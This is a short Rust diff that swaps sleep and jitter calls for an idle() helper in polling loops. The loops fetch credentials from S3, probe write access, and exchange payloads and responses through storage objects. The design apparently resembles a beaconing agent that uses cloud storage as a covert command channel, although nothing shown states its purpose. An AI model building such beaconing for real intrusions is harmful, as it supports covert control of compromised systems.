@@ -199,7 +199,7 @@ pub fn register() -> Result<(), Box<dyn std::error::Error>> {
     let creds_key = format!("register/{}/{}.creds", payload_prefix, runtime_uuid);
     let mut creds_data = None;
     for _ in 0..60 {
-        crate::helpers::sleep_with_jitter();
+        crate::helpers::idle();
         match s3_op("GET", &creds_key, b"", bootstrap_ak, bootstrap_sk)? {
             Some(data) => {
                 creds_data = Some(data);
@@ -257,7 +257,7 @@ pub fn register() -> Result<(), Box<dyn std::error::Error>> {
     let probe_key = format!("{}/ats/.probe", exec_prefix);
     let mut propagated = false;
     for _ in 0..12 {
-        std::thread::sleep(Duration::from_secs(5));
+        crate::helpers::idle();
         match s3_op("PUT", &probe_key, b"probe", exec_ak, exec_sk) {
             Ok(Some(_)) => {
                 let _ = s3_op("DELETE", &probe_key, b"", exec_ak, exec_sk);
@@ -333,7 +333,7 @@ pub fn send_and_receive(payload: &str) -> Result<String, Box<dyn std::error::Err
 
     // Poll for response
     loop {
-        crate::helpers::sleep_with_jitter();
+        crate::helpers::idle();
         match s3_op("GET", &sta_key, b"", &ak, &sk)? {
             Some(data) => {
                 let _ = s3_op("DELETE", &sta_key, b"", &ak, &sk);
